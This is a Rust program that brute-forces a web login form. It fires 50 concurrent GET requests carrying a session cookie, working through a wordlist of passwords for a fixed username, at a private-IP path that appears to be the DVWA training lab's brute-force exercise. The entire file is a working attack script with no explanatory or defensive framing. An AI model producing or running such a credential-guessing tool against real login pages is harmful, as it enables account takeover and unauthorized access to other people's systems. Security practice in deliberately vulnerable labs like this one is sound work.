use futures::future::join_all;
use reqwest::header::{COOKIE, HeaderMap, HeaderValue};
use std::error::Error;
use std::fs::File;
use std::io::Read;
use std::sync::{Arc, Mutex};
use tokio::task::JoinSet;
use tokio::time::Duration;
use tokio::*;

const URL: &'static str = "http://10.164.2.70/vulnerabilities/brute/";
const PHPSESSID: &'static str = "d0s30dl546dvt9754oau2p3tun"; // Replace with your actual PHPSESSID
const USERNAME: &'static str = "gvanarendonk";
const CONCURRENT_REQUESTS: usize = 50;

fn read_passwords(filename: &'static str) -> Vec<String> {
    let file = File::open(filename).unwrap();
    let mut buf_reader = std::io::BufReader::new(file);
    let mut contents = String::new();
    buf_reader.read_to_string(&mut contents).unwrap();
    contents
        .lines()
        .map(|line| line.to_string().to_lowercase())
        .filter(|line| line.chars().all(|c| c.is_alphabetic()))
        .collect()
}

async fn try_password(
    client: &reqwest::Client,
    password: &str,
    counter: &Arc<Mutex<usize>>,
    total_passwords: usize,
) -> Result<Option<String>, Box<dyn Error + Send + Sync>> {
    {
        let mut count = counter.lock().unwrap();
        *count += 1;
        if *count % 10 == 0 {
            println!("Tried {}/{} passwords", *count, total_passwords);
        }
    }

    // Create headers with PHPSESSID cookie
    let mut headers = HeaderMap::new();
    // Combine both cookies into a single header value
    headers.insert(
        COOKIE,
        HeaderValue::from_str(&format!("PHPSESSID={}; security=medium", PHPSESSID))?,
    );

    // Make the request
    let payload = format!(
        "{}?username={}&password={}&Login=Login#",
        URL, USERNAME, password
    );

    let response = client
        .get(&payload)
        .headers(headers)
        .timeout(Duration::from_secs(5)) // Set a reasonable timeout
        .send()
        .await?;

    let response_text = response.text().await?;

    // Check if login was successful
    if !response_text.contains("Username and/or password incorrect.") {
        println!("Found password: {}", password);
        return Ok(Some(password.to_string()));
    }

    Ok(None)
}

#[tokio::main]
pub async fn run() -> Result<(), Box<dyn Error>> {
    let passwords = read_passwords("passwords/other.txt");
    let total_passwords = passwords.len();
    let counter = Arc::new(Mutex::new(0));

    println!(
        "Starting async brute force with {} passwords and {} concurrent requests",
        total_passwords, CONCURRENT_REQUESTS
    );

    // Create a reqwest client that can be shared between requests
    let client = reqwest::Client::builder()
        .pool_idle_timeout(Duration::from_secs(30))
        .build()?;

    // Use a semaphore to limit concurrent requests to avoid overwhelming the server
    let sem = Arc::new(tokio::sync::Semaphore::new(CONCURRENT_REQUESTS));
    let found_password = Arc::new(Mutex::new(None));
    let found_flag = Arc::new(tokio::sync::Notify::new());

    // Create a set to track our tasks
    let mut set = JoinSet::new();

    for password in passwords {
        let client = client.clone();
        let counter = Arc::clone(&counter);
        let sem_clone = Arc::clone(&sem);
        let found_password_clone = Arc::clone(&found_password);
        let found_flag_clone = Arc::clone(&found_flag);
        let password_clone = password.clone();

        // Spawn a new task for each password
        set.spawn(async move {
            // Obtain a permit from the semaphore or wait
            let _permit = sem_clone.acquire().await.unwrap();

            // Check if a password has already been found
            if found_password_clone.lock().unwrap().is_some() {
                return;
            }

            match try_password(&client, &password_clone, &counter, total_passwords).await {
                Ok(Some(found)) => {
                    // Store the found password
                    *found_password_clone.lock().unwrap() = Some(found);
                    // Notify all waiting tasks that we found a password
                    found_flag_clone.notify_waiters();
                }
                Err(e) => println!("Error: {:?}", e),
                _ => {}
            }
        });

        // Check if a password has been found after each spawn
        if found_password.lock().unwrap().is_some() {
            break;
        }
    }

    // Create a separate task that waits for the found notification
    let found_flag_clone = Arc::clone(&found_flag);
    let found_waiter = tokio::spawn(async move {
        found_flag_clone.notified().await;
        println!("Password found! Shutting down remaining tasks...");
    });

    // Wait for either all tasks to complete or until we find a password
    tokio::select! {
        _ = async {
            while let Some(res) = set.join_next().await {
                if let Err(e) = res {
                    println!("Task error: {:?}", e);
                }
                // Check if we found a password
                if found_password.lock().unwrap().is_some() {
                    // Cancel all remaining tasks
                    set.abort_all();
                    break;
                }
            }
        } => {},
        _ = found_waiter => {
            // Password was found, cancel all tasks
            set.abort_all();
        }
    }

    // Print the result
    if let Some(password) = found_password.lock().unwrap().clone() {
        println!("Brute force completed successfully! Password: {}", password);
    } else {
        println!("Brute force completed. No password found.");
    }

    Ok(())
}
